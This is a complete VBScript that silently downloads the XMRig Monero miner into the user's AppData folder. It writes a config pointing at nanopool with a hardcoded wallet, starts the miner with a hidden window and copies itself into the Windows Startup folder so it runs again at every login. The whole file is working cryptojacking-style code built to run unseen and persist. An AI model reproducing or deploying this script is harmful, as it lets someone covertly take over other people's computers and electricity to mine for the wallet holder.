' ================================================
' XMRig Background Miner - One File Solution
' WITH HTTP API ENABLED for hashrate monitoring
' ================================================

Option Explicit

Dim objShell, objFSO, objHTTP, objStream, objWMI
Dim strWorkDir, strWallet, strPool, strVersion, strDownloadURL
Dim strXMRigPath, strConfigPath, strZipPath, strStartupPath

' Configuration
strWallet = "83ks8iCJFod4JH29c1ZkaNJJUJgsrEM7ePP6YxGUKaFY3VHTUs3xRPpVW7DDgkDAj4NfUg9yT4c7pC4jRUBX1mUYAZEkCwM"
strPool = "xmr-asia1.nanopool.org:10343"
strVersion = "6.22.0"
strDownloadURL = "https://github.com/xmrig/xmrig/releases/download/v" & strVersion & "/xmrig-" & strVersion & "-msvc-win64.zip"

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Setup paths
strWorkDir = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRig"
strXMRigPath = strWorkDir & "\xmrig.exe"
strConfigPath = strWorkDir & "\config.json"
strZipPath = strWorkDir & "\xmrig.zip"

' Create working directory if it doesn't exist
If Not objFSO.FolderExists(strWorkDir) Then
    objFSO.CreateFolder(strWorkDir)
End If

' Check if already running
If IsProcessRunning("xmrig.exe") Then
    WScript.Quit
End If

' Download and setup XMRig if not exists
If Not objFSO.FileExists(strXMRigPath) Then
    ' Download XMRig
    DownloadFile strDownloadURL, strZipPath
    
    ' Extract ZIP
    ExtractZip strZipPath, strWorkDir
    
    ' Move files from subfolder
    Dim objFolder, objSubFolder, objFile
    Set objFolder = objFSO.GetFolder(strWorkDir)
    For Each objSubFolder In objFolder.SubFolders
        If InStr(objSubFolder.Name, "xmrig-") > 0 Then
            For Each objFile In objSubFolder.Files
                objFile.Move strWorkDir & "\"
            Next
            objSubFolder.Delete True
            Exit For
        End If
    Next
    
    ' Delete ZIP
    If objFSO.FileExists(strZipPath) Then
        objFSO.DeleteFile strZipPath
    End If
End If

' Create config file with HTTP API enabled
CreateConfig strConfigPath, strWallet, strPool

' Add to startup (silently, automatically)
AddToStartup

' Start mining in background
objShell.Run """" & strXMRigPath & """ --config=""" & strConfigPath & """", 0, False

WScript.Quit

' ================================================
' Functions
' ================================================

Function DownloadFile(url, destination)
    On Error Resume Next
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile destination, 2
        objStream.Close
    End If
End Function

Function ExtractZip(zipFile, destination)
    On Error Resume Next
    Dim objShellApp
    Set objShellApp = CreateObject("Shell.Application")
    
    Dim zipFolder, destFolder
    Set zipFolder = objShellApp.NameSpace(zipFile)
    Set destFolder = objShellApp.NameSpace(destination)
    
    destFolder.CopyHere zipFolder.Items, 16 + 4
    
    ' Wait for extraction
    WScript.Sleep 5000
End Function

Function CreateConfig(configPath, wallet, pool)
    Dim objFile, strConfig
    
    strConfig = "{" & vbCrLf
    strConfig = strConfig & "    ""autosave"": false," & vbCrLf
    strConfig = strConfig & "    ""background"": true," & vbCrLf
    strConfig = strConfig & "    ""colors"": false," & vbCrLf
    strConfig = strConfig & "    ""http"": {" & vbCrLf
    strConfig = strConfig & "        ""enabled"": true," & vbCrLf
    strConfig = strConfig & "        ""host"": ""127.0.0.1""," & vbCrLf
    strConfig = strConfig & "        ""port"": 8080," & vbCrLf
    strConfig = strConfig & "        ""access-token"": null," & vbCrLf
    strConfig = strConfig & "        ""restricted"": true" & vbCrLf
    strConfig = strConfig & "    }," & vbCrLf
    strConfig = strConfig & "    ""cpu"": {" & vbCrLf
    strConfig = strConfig & "        ""enabled"": true," & vbCrLf
    strConfig = strConfig & "        ""huge-pages"": false," & vbCrLf
    strConfig = strConfig & "        ""max-threads-hint"": 50," & vbCrLf
    strConfig = strConfig & "        ""priority"": 1" & vbCrLf
    strConfig = strConfig & "    }," & vbCrLf
    strConfig = strConfig & "    ""pools"": [" & vbCrLf
    strConfig = strConfig & "        {" & vbCrLf
    strConfig = strConfig & "            ""algo"": ""rx/0""," & vbCrLf
    strConfig = strConfig & "            ""coin"": ""monero""," & vbCrLf
    strConfig = strConfig & "            ""url"": """ & pool & """," & vbCrLf
    strConfig = strConfig & "            ""user"": """ & wallet & """," & vbCrLf
    strConfig = strConfig & "            ""pass"": ""x""," & vbCrLf
    strConfig = strConfig & "            ""tls"": true," & vbCrLf
    strConfig = strConfig & "            ""keepalive"": true" & vbCrLf
    strConfig = strConfig & "        }," & vbCrLf
    strConfig = strConfig & "        {" & vbCrLf
    strConfig = strConfig & "            ""algo"": ""rx/0""," & vbCrLf
    strConfig = strConfig & "            ""coin"": ""monero""," & vbCrLf
    strConfig = strConfig & "            ""url"": ""xmr-jp1.nanopool.org:10343""," & vbCrLf
    strConfig = strConfig & "            ""user"": """ & wallet & """," & vbCrLf
    strConfig = strConfig & "            ""pass"": ""x""," & vbCrLf
    strConfig = strConfig & "            ""tls"": true," & vbCrLf
    strConfig = strConfig & "            ""keepalive"": true" & vbCrLf
    strConfig = strConfig & "        }," & vbCrLf
    strConfig = strConfig & "        {" & vbCrLf
    strConfig = strConfig & "            ""algo"": ""rx/0""," & vbCrLf
    strConfig = strConfig & "            ""coin"": ""monero""," & vbCrLf
    strConfig = strConfig & "            ""url"": ""xmr-au1.nanopool.org:10343""," & vbCrLf
    strConfig = strConfig & "            ""user"": """ & wallet & """," & vbCrLf
    strConfig = strConfig & "            ""pass"": ""x""," & vbCrLf
    strConfig = strConfig & "            ""tls"": true," & vbCrLf
    strConfig = strConfig & "            ""keepalive"": true" & vbCrLf
    strConfig = strConfig & "        }" & vbCrLf
    strConfig = strConfig & "    ]" & vbCrLf
    strConfig = strConfig & "}"
    
    Set objFile = objFSO.CreateTextFile(configPath, True)
    objFile.Write strConfig
    objFile.Close
End Function

Function AddToStartup()
    On Error Resume Next
    Dim strStartupFolder, strThisScript, strStartupScript
    
    strStartupFolder = objShell.SpecialFolders("Startup")
    strThisScript = WScript.ScriptFullName
    strStartupScript = strStartupFolder & "\MoneroMiner.vbs"
    
    ' Copy this script to startup folder if not already there
    If strThisScript <> strStartupScript Then
        If objFSO.FileExists(strStartupScript) Then
            objFSO.DeleteFile strStartupScript
        End If
        objFSO.CopyFile strThisScript, strStartupScript, True
    End If
End Function

Function IsProcessRunning(processName)
    On Error Resume Next
    Dim objWMIService, colProcesses, objProcess
    
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
    
    IsProcessRunning = (colProcesses.Count > 0)
End Function
